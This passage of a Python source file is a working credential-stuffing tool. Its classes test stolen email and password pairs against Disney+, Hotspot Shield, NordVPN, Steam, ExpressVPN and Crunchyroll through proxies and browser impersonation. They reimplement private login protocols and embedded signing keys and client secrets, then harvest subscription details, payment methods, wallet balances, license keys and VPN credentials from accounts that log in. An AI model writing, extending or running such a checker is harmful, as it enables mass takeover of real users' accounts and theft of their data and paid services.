                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}
        session = curl_requests.Session(impersonate="chrome131_android")
        if proxies:
            session.proxies = proxies

        result = {"status": "error", "message": "", "email": email, "password": password}

        device_token = self._spawn_device(session)
        if not device_token:
            result["message"] = "Device registration failed"
            return result

        if not self._verify_email(session, device_token, email):
            result["status"] = "bad"
            result["message"] = "Email not registered"
            return result

        user_token, is_subscriber, country, error_code = self._login(session, device_token, email, password)
        if error_code:
            if "bad-credentials" in error_code.lower():
                result["status"] = "bad"
                result["message"] = "Wrong password"
            else:
                result["status"] = "error"
                result["message"] = f"Login error: {error_code}"
            return result

        if not user_token:
            result["status"] = "bad"
            result["message"] = "Login failed"
            return result

        account_data = self._fetch_account_details(session, user_token)
        sub_details = self._get_sub_details(session, user_token)

        if sub_details.get("is_active", False):
            result["status"] = "premium"
            result["plan"] = sub_details.get("plan", "Disney+ Premium")
            result["renewal"] = sub_details.get("next_renewal", "")
            result["country"] = country
            if account_data:
                identity = account_data.get("identity", {})
                subs = identity.get("subscriber", {}).get("subscriptions", [])
                if subs:
                    sub = subs[0]
                    result["expiry_date"] = sub.get("term", {}).get("expiryDate", "")[:10]
                    result["partner"] = sub.get("partner", "")
            result["message"] = f"Plan: {result.get('plan')}, Country: {country}, Renewal: {result.get('renewal')}"
        else:
            result["status"] = "free"
            result["message"] = "No active subscription"

        return result

# ----- 4. Hotspot Shield Checker -----
class HotspotShieldChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
        ]
        ua = safe_choice(user_agents, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        sess = requests.Session()

        r = sess.post(
            'https://origin.app.hotspotshield.com/api/user/login',
            data=f'login={email}&password={password}',
            headers={
                'User-Agent': ua,
                'Accept': 'application/json, text/plain, */*',
                'Accept-Language': 'en-US,en;q=0.5',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://app.hotspotshield.com',
                'Referer': 'https://app.hotspotshield.com/sign-in',
            },
            proxies=proxies,
            timeout=10,
            verify=False
        )
        text = r.text

        if any(k in text for k in ['"status":false', 'LOGIN/PWD INCORRECT', 'INVALID_REQUEST']):
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result
        if '"captcha":true' in text or 'MAX_ATTEMPTS' in text:
            result["status"] = "error"
            result["message"] = "Captcha or rate limit"
            return result
        if '"status":true' not in text:
            result["status"] = "error"
            result["message"] = "Unknown login response"
            return result

        i = sess.get(
            'https://origin.app.hotspotshield.com/api/user/info',
            headers={
                'User-Agent': ua,
                'Accept': 'application/json, text/plain, */*',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Origin': 'https://hotspotshield.aura.com',
                'Referer': 'https://hotspotshield.aura.com/sign-in',
            },
            proxies=proxies,
            timeout=10,
            verify=False
        )
        src = i.text

        def extract(pattern):
            m = re.search(pattern, src)
            return m.group(1) if m else 'N/A'

        plan = extract(r'"plan":"([^"]+)"')
        billing = extract(r'"billingPeriod":"([^"]+)"')
        expiry = extract(r'"activeBefore":"([^"T]+)')
        price = extract(r'"price":"([^"]+)"')
        country = extract(r'"country":"([^"]+)"')
        payment = extract(r'"title":"([^"]+)"')

        days_left = 'N/A'
        if expiry != 'N/A':
            try:
                dt_exp = datetime.strptime(expiry, '%Y-%m-%d')
                days_left = str((dt_exp - datetime.now()).days)
            except:
                pass

        if '"plan":"Basic"' in src:
            result["status"] = "free"
            result["message"] = "Free plan"
        elif '"isExpired":true' in src:
            result["status"] = "expired"
            result["message"] = "Expired subscription"
        else:
            result["status"] = "premium"
            result["message"] = f"Plan: {plan}, Billing: {billing}, Expires: {expiry} ({days_left} days)"
            result.update({
                "plan": plan,
                "billing_period": billing,
                "expiry_date": expiry,
                "days_left": days_left,
                "price": price,
                "country": country,
                "payment_method": payment
            })

        return result

# ----- 5. NordVPN Checker -----
class NordVPNChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (curl_requests.errors.ProxyError, curl_requests.errors.Timeout, curl_requests.errors.ConnectionError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        sess = curl_requests.Session(impersonate="firefox133")
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1",
            "Sec-Fetch-Dest": "document",
            "Sec-Fetch-Mode": "navigate",
            "Sec-Fetch-Site": "none",
            "Sec-Fetch-User": "?1",
        }

        r = sess.get("https://my.nordaccount.com/oauth2/login", headers=headers, proxies=proxies, timeout=12)
        if "Just a moment..." in r.text:
            result["message"] = "Cloudflare challenge"
            return result

        login_url = r.url
        csrf = sess.cookies.get("csrf") or ""

        post_h = headers.copy()
        post_h["Referer"] = login_url
        post_h["Origin"] = "https://nordaccount.com"
        r = sess.post(login_url, headers=post_h, data={"identifier": email, "_csrf": csrf}, proxies=proxies, timeout=12)
        pw_url = r.url
        csrf = sess.cookies.get("csrf") or ""

        post_h["Referer"] = pw_url
        r = sess.post(pw_url, headers=post_h, data={"password": password, "_csrf": csrf},
                      proxies=proxies, timeout=12, allow_redirects=False)

        src = r.text
        loc = r.headers.get("Location", "")

        if "The password you entered is incorrect." in src or r.status_code == 400:
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result

        if "/login/leaked?challenge=" in loc:
            result["status"] = "bad"
            result["message"] = "Leaked password"
            return result

        if "approval_prompt" not in loc:
            result["status"] = "error"
            result["message"] = f"Unexpected redirect: {loc}"
            return result

        url = loc
        for _ in range(4):
            if not url:
                break
            r = sess.get(url, headers=headers, allow_redirects=False, timeout=12)
            url = r.headers.get("Location", "")

        csrf = sess.cookies.get("csrf") or ""

        r = sess.get(
            "https://my.nordaccount.com/api/v1/subscriptions",
            headers={
                "user-agent": headers["Accept"],
                "accept": "*/*",
                "accept-language": "en-US,en;q=0.5",
                "referer": "https://my.nordaccount.com/dashboard/",
                "x-csrf-token": csrf,
            },
            timeout=12
        )
        data = r.json()

        if not data or not isinstance(data, list) or len(data) == 0:
            result["status"] = "free"
            result["message"] = "No active subscription"
            return result

        sub = data[0]
        plans = sub.get("plans", [])
        plan = plans[0].get("display_title", "?") if plans else "?"
        products = sub.get("products", [])
        fi = sub.get("frequency_interval", "")
        fu = sub.get("frequency_unit", "")
        fm = sub.get("frequency_interval_months", "")
        renewable = sub.get("is_renewable", False)
        next_payment = sub.get("next_payment_at", "")
        expiry = next_payment.split("T")[0] if next_payment else "?"

        days = "?"
        if expiry != "?":
            try:
                ed = datetime.strptime(expiry, "%Y-%m-%d").replace(tzinfo=timezone.utc)
                days = (ed - datetime.now(timezone.utc)).days
            except:
                pass

        if isinstance(days, int) and days <= 0:
            result["status"] = "expired"
            result["message"] = f"Expired subscription (plan: {plan})"
        else:
            result["status"] = "premium"
            result["message"] = f"Plan: {plan}, Products: {', '.join(products)}, Type: {fi} {fu} ({fm}m), Renewable: {renewable}, Expiry: {expiry}, Days: {days}"
            result.update({
                "plan": plan,
                "products": ", ".join(products),
                "billing_type": f"{fi} {fu} ({fm}m)",
                "renewable": renewable,
                "expiry_date": expiry,
                "days_left": days
            })

        return result

# ----- 6. Steam Checker (fixed with full network exception handling) -----
class SteamChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.timeout = 15

    def _varint(self, v):
        if v < 0:
            v &= 0xffffffffffffffff
        buf = bytearray()
        while v > 0x7f:
            buf.append(0x80 | (v & 0x7f))
            v >>= 7
        buf.append(v & 0x7f)
        return bytes(buf)

    def _read_varint(self, data, pos):
        result = shift = 0
        while pos < len(data):
            byte = data[pos]; pos += 1
            result |= (byte & 0x7f) << shift
            if not (byte & 0x80):
                break
            shift += 7
        return result, pos

    def _field_string(self, field, value):
        value = value.encode() if isinstance(value, str) else value
        return self._varint((field << 3) | 2) + self._varint(len(value)) + value

    def _field_bytes(self, field, data):
        return self._varint((field << 3) | 2) + self._varint(len(data)) + data

    def _field_int(self, field, value):
        return self._varint(field << 3) + self._varint(value if value >= 0 else value & 0xffffffffffffffff)

    def _parse_protobuf(self, data):
        result = {}
        pos = 0
        while pos < len(data):
            try:
                tag, pos = self._read_varint(data, pos)
            except:
                break
            field = tag >> 3
            wire = tag & 7
            if field < 1:
                break
            if wire == 0:
                val, pos = self._read_varint(data, pos)
                prev = result.get(field)
                if prev is not None:
                    result[field] = [prev, val] if not isinstance(prev, list) else prev + [val]
                else:
                    result[field] = val
            elif wire == 2:
                length, pos = self._read_varint(data, pos)
                if pos + length > len(data):
                    break
                chunk = data[pos:pos + length]
                pos += length
                prev = result.get(field)
                if prev is not None:
                    result[field] = [prev, chunk] if not isinstance(prev, list) else prev + [chunk]
                else:
                    result[field] = chunk
            elif wire == 5:
                if pos + 4 > len(data):
                    break
                result[field] = struct.unpack_from('<I', data, pos)[0]
                pos += 4
            elif wire == 1:
                if pos + 8 > len(data):
                    break
                result[field] = struct.unpack_from('<Q', data, pos)[0]
                pos += 8
            else:
                break
        return result

    def _rsa_encrypt(self, password, mod_hex, exp_hex):
        mod_bytes = bytes.fromhex(mod_hex)
        n = int.from_bytes(mod_bytes, 'big')
        e = int(exp_hex, 16)
        pw_bytes = password.encode()
        key_len = len(mod_bytes)
        pad_len = key_len - len(pw_bytes) - 3
        pad = bytes(random.randint(1, 255) for _ in range(pad_len))
        block = b'\x00\x02' + pad + b'\x00' + pw_bytes
        m = int.from_bytes(block, 'big')
        c = pow(m, e, n)
        return base64.b64encode(c.to_bytes(key_len, 'big')).decode()

    def check(self, identifier: str, password: str) -> Dict:
        max_retries = 1
        last_exception = None
        for attempt in range(max_retries):
            try:
                return self._check_internal(identifier, password)
            except Exception as e:
                # Only retry on network/connection errors
                if isinstance(e, (
                    requests.exceptions.ConnectionError,
                    requests.exceptions.Timeout,
                    requests.exceptions.ProxyError,
                    requests.exceptions.ChunkedEncodingError,
                    requests.exceptions.StreamConsumedError,
                    requests.exceptions.ContentDecodingError,
                    requests.exceptions.RetryError,
                    requests.exceptions.RequestException,
                    urllib3.exceptions.ProtocolError,
                    urllib3.exceptions.ReadTimeoutError,
                    ConnectionResetError,
                    BrokenPipeError,
                )):
                    last_exception = e
                    if attempt == max_retries - 1:
                        return {
                            "status": "error",
                            "email": identifier,
                            "password": password,
                            "message": f"Network error: {str(e)[:80]}"
                        }
                    pass
                    continue
                else:
                    # Non‑network error – raise immediately
                    raise e
        return {
            "status": "error",
            "email": identifier,
            "password": password,
            "message": f"Max retries exceeded: {last_exception}"
        }

    def _check_internal(self, identifier: str, password: str) -> Dict:
        result = {"status": "error", "email": identifier, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        sess = requests.Session()
        sess.headers.update({
            "Accept": "application/json, text/plain, */*",
            "Accept-Encoding": "gzip",
            "Connection": "Keep-Alive",
            "User-Agent": "okhttp/4.9.2",
        })

        boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW"
        multipart_ct = f"multipart/form-data; boundary={boundary}"
        def multipart_field(key, value):
            return (
                f"------{boundary}\r\n"
                f"Content-Disposition: form-data; name=\"{key}\"\r\n\r\n"
                f"{value}\r\n"
                f"------{boundary}--\r\n"
            ).encode()

        # RSA key
        pb = self._field_string(1, identifier)
        enc = urlparse.quote(base64.b64encode(pb).decode())
        r = sess.get(
            f"https://api.steampowered.com/IAuthenticationService/GetPasswordRSAPublicKey/v1"
            f"?origin=SteamMobile&input_protobuf_encoded={enc}",
            timeout=self.timeout, proxies=proxies
        )
        if r.status_code != 200:
            result["message"] = f"RSA request failed: {r.status_code}"
            return result
        rsa_data = self._parse_protobuf(r.content)
        mod = rsa_data.get(1, b"").decode()
        exp = rsa_data.get(2, b"").decode()
        timestamp = rsa_data.get(3, 0)
        if not mod or not exp:
            result["message"] = "RSA key empty"
            return result

        enc_pass = self._rsa_encrypt(password, mod, exp)

        # Begin auth
        device = self._field_string(1, "SM-S256B") + self._field_int(2, 3) + self._field_int(3, -500) + self._field_int(4, 1)
        auth_msg = (
            self._field_string(2, identifier) +
            self._field_string(3, enc_pass) +
            self._field_int(4, timestamp) +
            self._field_int(5, 1) +
            self._field_int(7, 1) +
            self._field_string(8, "Mobile") +
            self._field_bytes(9, device) +
            self._field_int(11, 0)
        )
        b64_auth = base64.b64encode(auth_msg).decode()
        r = sess.post(
            "https://api.steampowered.com/IAuthenticationService/BeginAuthSessionViaCredentials/v1",
            data=multipart_field("input_protobuf_encoded", b64_auth),
            headers={"Content-Type": multipart_ct},
            proxies=proxies, timeout=self.timeout
        )
        eresult = int(r.headers.get("X-eresult", "0"))
        if eresult in (5, 2):
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result
        if eresult in (63, 43):
            result["status"] = "bad"
            result["message"] = "Account banned"
            return result
        if eresult != 1:
            result["message"] = f"Auth error: eresult {eresult}"
            return result

        auth_data = self._parse_protobuf(r.content)
        client_id = auth_data.get(1, 0)
        request_id = auth_data.get(2, b"")
        steam_id = auth_data.get(5, 0)

        # Check 2FA
        confs = auth_data.get(4, [])
        if not isinstance(confs, list):
            confs = [confs] if confs else []
        twofa_types = []
        for c in confs:
            if isinstance(c, bytes):
                parsed = self._parse_protobuf(c)
                t = parsed.get(1, 0)
                if isinstance(t, list):
                    twofa_types.extend(t)
                else:
                    twofa_types.append(t)
        if any(t in (2,3,4,5,6) for t in twofa_types):
            result["status"] = "2fa"
            result["message"] = "2FA required"
            return result

        # Poll
        poll = self._field_int(1, client_id) + self._field_bytes(2, request_id)
        poll_b64 = base64.b64encode(poll).decode()
        r = sess.post(
            "https://api.steampowered.com/IAuthenticationService/PollAuthSessionStatus/v1",
            data=multipart_field("input_protobuf_encoded", poll_b64),
            headers={"Content-Type": multipart_ct, "Accept-Encoding": "identity"},
            proxies=proxies, timeout=self.timeout
        )
        poll_data = self._parse_protobuf(r.content)
        token = poll_data.get(4, b"")
        if isinstance(token, bytes):
            token = token.decode("utf-8", errors="ignore")
        if not token:
            result["message"] = "No token from poll"
            return result

        # Set cookies
        parts = token.split(".")
        if len(parts) < 2:
            result["message"] = "Bad JWT"
            return result
        payload = parts[1]
        rem = len(payload) % 4
        if rem:
            payload += "=" * (4 - rem)
        try:
            jwt = json.loads(base64.urlsafe_b64decode(payload))
        except:
            jwt = {}
        steam_id_str = str(jwt.get("sub", steam_id))
        sess.cookies.set("Steam_Language", "english")
        sess.cookies.set("steamLoginSecure", f"{steam_id_str}%7C%7C{urlparse.quote(token)}")
        sess.cookies.set("mobileClient", "android")
        sess.cookies.set("mobileClientVersion", "777777 3.10.9")

        # Country
        cpb = struct.pack('<BQ', 0x09, int(steam_id_str))
        r = sess.post(
            f"https://api.steampowered.com/IUserAccountService/GetUserCountry/v1"
            f"?access_token={token}&spoof_steamid=",
            data=multipart_field("input_protobuf_encoded", base64.b64encode(cpb).decode()),
            headers={"Content-Type": multipart_ct},
            proxies=proxies, timeout=self.timeout
        )
        cr = self._parse_protobuf(r.content)
        cc = cr.get(1, b"").decode() if cr.get(1) else ""

        # Games
        try:
            gpb = (
                self._field_int(1, int(steam_id_str)) +
                self._field_int(2, 1) +
                self._field_int(3, 1) +
                self._field_int(6, 0) +
                self._field_string(7, "english") +
                self._field_int(8, 1)
            )
            gb64 = urlparse.quote(base64.b64encode(gpb).decode())
            r = sess.get(
                f"https://api.steampowered.com/IPlayerService/GetOwnedGames/v1"
                f"?access_token={token}&spoof_steamid=&origin=SteamMobile"
                f"&input_protobuf_encoded={gb64}",
                proxies=proxies, timeout=self.timeout
            )
            gr = self._parse_protobuf(r.content)
            game_count = gr.get(1, 0)
            raw_games = gr.get(2, [])
            if not isinstance(raw_games, list):
                raw_games = [raw_games] if raw_games else []
            names = []
            for g in raw_games:
                if isinstance(g, bytes):
                    gf = self._parse_protobuf(g)
                    nm = gf.get(2, b"").decode(errors="replace") if gf.get(2) else ""
                    if nm:
                        names.append(nm)
        except:
            game_count = 0
            names = []

        # Level
        level = ""
        try:
            mpid = int(steam_id_str) - 76561197960265728
            r = sess.get(f"https://steamcommunity.com/miniprofile/{mpid}/json", proxies=proxies, timeout=self.timeout)
            if r.status_code == 200:
                try:
                    mpj = r.json()
                    level = str(mpj.get("level", ""))
                except:
                    m = re.search(r'friendPlayerLevel\s+(\S+)', r.text)
                    if m:
                        level = m.group(1)
        except:
            pass

        # Wallet
        balance = ""
        try:
            r = sess.post(
                f"https://api.steampowered.com/IUserAccountService/GetClientWalletDetails/v1"
                f"?access_token={token}&spoof_steamid=",
                data=multipart_field("input_protobuf_encoded", "GAE="),
                headers={"Content-Type": multipart_ct},
                proxies=proxies, timeout=self.timeout
            )
            wr = self._parse_protobuf(r.content)
            bal = wr.get(14, b"")
            if isinstance(bal, bytes):
                balance = bal.decode("utf-8", errors="ignore")
            elif isinstance(bal, int):
                balance = str(bal)
        except:
            pass

        result["status"] = "premium"
        result["steam_id"] = steam_id_str
        result["country"] = cc
        result["level"] = level
        result["games"] = game_count
        result["game_list"] = names
        result["balance"] = balance
        result["message"] = f"SteamID: {steam_id_str}, Country: {cc}, Level: {level}, Games: {game_count}, Wallet: {balance}"
        return result

# ----- 7. ExpressVPN Checker -----
class ExpressVPNChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.cert_base64 = "MIIDXTCCAkWgAwIBAgIJALPWYfHAoH+CMA0GCSqGSIb3DQEBCwUAMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwHhcNMTcxMTA5MDUwNTIzWhcNMjcxMTA3MDUwNTIzWjBFMQswCQYDVQQGEwJBVTETMBEGA1UECAwKU29tZS1TdGF0ZTEhMB8GA1UECgwYSW50ZXJuZXQgV2lkZ2l0cyBQdHkgTHRkMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAtUCqVSHRqQ5XnrnA4KEnGSLGRSHWgyOgpNzNjEUmjlO25Ojncaw0u+hHAns8I3kNPk0qFlGP7oLeZvFH8+duDF02j4yVFDHkHRGyTBe3PsYvztDVzmddtG8eBgwJ88PocBXDjJvCojfkyQ8sY4EtK3y0UDJj4uJKckVdLUL8wFt2DPj+A3E4/KgYELNXA3oUlNjFwr4kqpxeDjvTi3W4T02bhRXYXgDMgQgtLZMpf1zOpM2lfqRq6sFoOmzlBTv2qbvmcOSEz3ZamwFxoYDB86EfnKPCq6ZareO/1MWGHwxH24SoJhFmyOsvq/kPPa03GJnKtMUznTnBVhwWy7KJIwIDAQABo1AwTjAdBgNVHQ4EFgQUoKnoagA0CLOLTzDb2lQ/v/osUz0wHwYDVR0jBBgwFoAUoKnoagA0CLOLTzDb2lQ/v/osUz0wDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAmF8BLuzF0rY2T2v2jTpCiqKxXARjalSjmDJLzDTWojrurHC5C/xVB8Hg+8USHPoM4V7Hr0zE4GYT5N5V+pJp/CUHppzzY9uYAJ1iXJpLXQyRD/SR4BaacMHUqakMjRbm3hwyi/pe4oQmyg66rZClV6eBxEnFKofArNtdCZWGliRAy9P8krF8poSElJtvlYQ70vWiZVIU7kV6adMVFtmPq4stjog7c2Pu0EEylRlclWlD0r8YSuvA8XoMboYyfp+RiyixhqL1o2C1JJTjY4S/t+UvQq5xTsWun+PrDoEtupjto/0sRGnD9GB5Pe0J2+VGbx3ITPStNzOuxZ4BXLe7YA=="
        self.hmac_key = "@~y{T4]wfJMA},qG}06rDO{f0<kYEwYWX'K)-GOyB^exg;K_k-J7j%$)L@[2me3~"
        self.crypto = AesCryptographyService()

    def _get_session(self):
        session = requests.Session()
        session.headers.update({'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2'})
        return session

    def _generate_install_id(self) -> str:
        return ''.join(random.choices(string.ascii_lowercase + string.digits, k=64))

    def check(self, email: str, password: str) -> Dict:
        max_retries = 1
        for attempt in range(max_retries):
            try:
                return self._check_internal(email, password)
            except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ProxyError) as e:
                if attempt == max_retries - 1:
                    return {"status": "error", "email": email, "password": password, "message": f"Network error: {str(e)[:80]}"}
                pass
                continue
        return {"status": "error", "email": email, "password": password, "message": "Max retries exceeded"}

    def _check_internal(self, email: str, password: str) -> Dict:
        result = {"status": "error", "email": email, "password": password, "message": ""}
        proxies = None
        if self.proxy:
            proxies = {"http": self.proxy, "https": self.proxy}

        iv = CryptoHelper.get_byte_array(16)
        key = CryptoHelper.get_byte_array(16)
        base64_iv = base64.b64encode(iv).decode('ascii')
        base64_key = base64.b64encode(key).decode('ascii')
        install_id = self._generate_install_id()

        post_data_dict = {"email": email, "iv": base64_iv, "key": base64_key, "password": password}
        post_data = json.dumps(post_data_dict)
        gzipped = CryptoHelper.gzip_data(post_data)
        encrypted_post = CryptoHelper.envelope_encrypt(gzipped, self.cert_base64)

        header_raw = f"POST /apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        header_signature = CryptoHelper.compute_signature(header_raw.encode('ascii'), self.hmac_key.encode('ascii'))
        post_signature = CryptoHelper.compute_signature(encrypted_post, self.hmac_key.encode('ascii'))

        session = self._get_session()
        url = f"https://www.expressapisv2.net/apis/v2/credentials?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        headers = {
            'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
            'Expect': '',
            'Content-Type': 'application/octet-stream',
            'X-Body-Compression': 'gzip',
            'X-Signature': f'2 {header_signature} 91c776e',
            'X-Body-Signature': f'2 {post_signature} 91c776e',
            'Accept-Language': 'en',
            'Accept-Encoding': 'gzip, deflate'
        }
        response = session.post(url, data=encrypted_post, headers=headers, proxies=proxies, timeout=15, verify=False)

        if response.status_code == 401 or response.status_code == 400:
            result["status"] = "bad"
            result["message"] = "Invalid credentials"
            return result
        elif response.status_code == 500:
            result["status"] = "error"
            result["message"] = "Banned/blocked"
            return result
        elif response.status_code != 200:
            result["message"] = f"HTTP {response.status_code}"
            return result

        try:
            decrypted = self.crypto.decrypt(response.content, base64.b64decode(base64_key), base64.b64decode(base64_iv))
            response_body = decrypted.decode('utf-8', errors='ignore')
        except Exception as e:
            result["message"] = f"Decryption failed: {str(e)}"
            return result

        try:
            access_token = re.search(r'"access_token":"([^"]+)"', response_body).group(1)
            ovpn_user = re.search(r'"ovpn_username":"([^"]+)"', response_body).group(1)
            ovpn_pass = re.search(r'"ovpn_password":"([^"]+)"', response_body).group(1)
            pptp_user = re.search(r'"pptp_username":"([^"]+)"', response_body).group(1)
            pptp_pass = re.search(r'"pptp_password":"([^"]+)"', response_body).group(1)
        except:
            result["message"] = "Failed to parse tokens"
            return result

        # subscription
        sub_raw = f"GET /apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"
        sub_signature = CryptoHelper.compute_signature(sub_raw.encode('ascii'), self.hmac_key.encode('ascii'))
        batch_raw = f"POST /apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        batch_signature = CryptoHelper.compute_signature(batch_raw.encode('ascii'), self.hmac_key.encode('ascii'))
        capture_body = f'[{{"headers":{{"Accept-Language":"en","X-Signature":"2 {sub_signature} 91c776e"}},"method":"GET","url":"/apis/v2/subscription?access_token={access_token}&client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4&reason=activation_with_email"}}]'
        capture_signature = CryptoHelper.compute_signature(capture_body.encode('ascii'), self.hmac_key.encode('ascii'))
        batch_url = f"https://www.expressapisv2.net/apis/v2/batch?client_version=11.5.2&installation_id={install_id}&os_name=ios&os_version=14.4"
        batch_headers = {
            'User-Agent': 'xvclient/v21.21.0 (ios; 14.4) ui/11.5.2',
            'X-Body-Compression': 'gzip',
            'X-Signature': f'2 {batch_signature} 91c776e',
            'X-Body-Signature': f'2 {capture_signature} 91c776e',
            'Accept-Language': 'en',
            'Accept-Encoding': 'gzip, deflate'
        }
        batch_response = session.post(batch_url, data=capture_body, headers=batch_headers, proxies=proxies, timeout=15, verify=False)
        if 'subscription' not in batch_response.text or 'REVOKED' in batch_response.text or 'status\\\":\\\"\\\"' in batch_response.text:
            result["status"] = "expired"
            result["message"] = "Subscription expired or revoked"
            return result

        unescaped = batch_response.text.encode().decode('unicode_escape')
        plan_match = re.search(r'billing_cycle":(\d+)', unescaped)
        plan = f"{plan_match.group(1)} Month" if plan_match else "Unknown"
        auto_renew_match = re.search(r'auto_bill":([^,]+)', unescaped)
        auto_renew = auto_renew_match.group(1) if auto_renew_match else "false"
        exp_match = re.search(r'expiration_time":(\d+)', unescaped)
        expiration = int(exp_match.group(1)) if exp_match else 0
        current_time = int(time.time())
        days_left = round((expiration - current_time) / 86400) if expiration > current_time else 0
        expire_date = safe_strftime(datetime.fromtimestamp(expiration), '%Y-%m-%d') if expiration else 'N/A'
        payment_match = re.search(r'payment_method":"([^"]+)"', unescaped)
        payment = payment_match.group(1) if payment_match else "Unknown"

        # license key
        license_code = "N/A"
        web_headers = {
            'Host': 'www.expressvpn.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:147.0) Gecko/20100101 Firefox/147.0',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Referer': 'https://portal.expressvpn.com/my-subscriptions',
            'authorization': f'Bearer {access_token}',
            'content-type': 'application/json',
            'x-tenant': 'xvpn',
            'Origin': 'https://portal.expressvpn.com',
            'Connection': 'keep-alive'
        }
        try:
            web_resp = session.get('https://www.expressvpn.com/api/v2/subscriptions', headers=web_headers, proxies=proxies, timeout=15, verify=False)
            licenses = re.findall(r'longCode":"([^"]+)"', web_resp.text)
            license_code = licenses[-1] if licenses else "N/A"
        except:
            pass

        result["status"] = "premium"
        result["plan"] = plan
        result["auto_renew"] = auto_renew == 'true'
        result["expire_date"] = expire_date
        result["days_left"] = days_left
        result["payment_method"] = payment
        result["license"] = license_code
        result["ovpn_user"] = ovpn_user
        result["ovpn_pass"] = ovpn_pass
        result["pptp_user"] = pptp_user
        result["pptp_pass"] = pptp_pass
        result["message"] = f"Plan: {plan}, Expires: {expire_date} ({days_left} days)"

        return result

# ----- 8. Crunchyroll Checker -----
class CrunchyrollChecker:
    def __init__(self, proxy: Optional[str] = None):
        self.proxy = proxy
        self.timeout = 25
        self.max_retry = 3
        self.brn_api = "https://beta-api.crunchyroll.com"
        self.brn_cid = "rjs0ltx0dbwkliwxdzdf"
        self.brn_sec = "4V7rf21-UFXeZ-5XAd0X_QPwr1gu_i1s"
        self.plan_map = {"1": "FAN", "4": "MEGA FAN", "6": "ULTIMATE FAN"}
        self.baron_ua = "Crunchyroll/ANDROIDTV/3.65.0_22347 (Android 10; en-US; sdk_google_atv_x86)"
        self.baro_wua = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/28.0 Chrome/130.0.0.0 Mobile Safari/537.36"
        self.country_map = {
            "US": "United States", "GB": "United Kingdom", "DE": "Germany", "FR": "France",
            "ES": "Spain", "IT": "Italy", "TR": "Turkey", "BR": "Brazil", "JP": "Japan",
            "KR": "South Korea", "IN": "India", "CA": "Canada", "AU": "Australia", "MX": "Mexico",
            "NL": "Netherlands", "SE": "Sweden", "NO": "Norway", "DK": "Denmark", "FI": "Finland",
            "PL": "Poland", "RU": "Russia", "AR": "Argentina", "CL": "Chile", "CO": "Colombia",
            "PE": "Peru", "AE": "UAE", "SA": "Saudi Arabia", "EG": "Egypt", "ZA": "South Africa",
            "ID": "Indonesia", "MY": "Malaysia", "SG": "Singapore", "TH": "Thailand", "VN": "Vietnam",
            "PH": "Philippines", "KE": "Kenya", "NG": "Nigeria", "GH": "Ghana", "PT": "Portugal",
            "RO": "Romania", "HU": "Hungary", "CZ": "Czech Republic", "UA": "Ukraine",
            "AT": "Austria", "CH": "Switzerland", "BE": "Belgium", "IL": "Israel", "TW": "Taiwan",
